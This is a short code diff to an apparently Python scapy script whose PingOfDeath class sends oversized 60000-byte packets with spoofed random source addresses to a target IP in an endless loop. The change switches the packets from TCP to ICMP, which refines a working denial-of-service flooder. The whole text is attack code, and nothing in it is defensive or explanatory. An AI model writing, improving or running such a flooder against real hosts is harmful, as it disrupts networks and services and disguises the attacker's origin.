@@ -7,9 +7,8 @@ host_ip = socket.gethostbyname(host_name)
 
 
 class PingOfDeath:
-    def __init__(self, dst_ip, dst_port):
+    def __init__(self, dst_ip):
         self.dst_ip = dst_ip
-        self.dst_port = dst_port
         self.sending = True                          # current process
         self.sending_count = 0                       # syn count
         self.data = "x" * 60000           # data
@@ -17,7 +16,7 @@ class PingOfDeath:
     def ping_of_death(self, count):
         while self.sending:
             L3 = IP(src=random_ip.random_ip(), dst=self.dst_ip)
-            L4 = TCP(sport=RandShort())
+            L4 = ICMP()
             L5 = Raw(load=self.data)
             pkt = L3 / L4 / L5
             send(pkt)
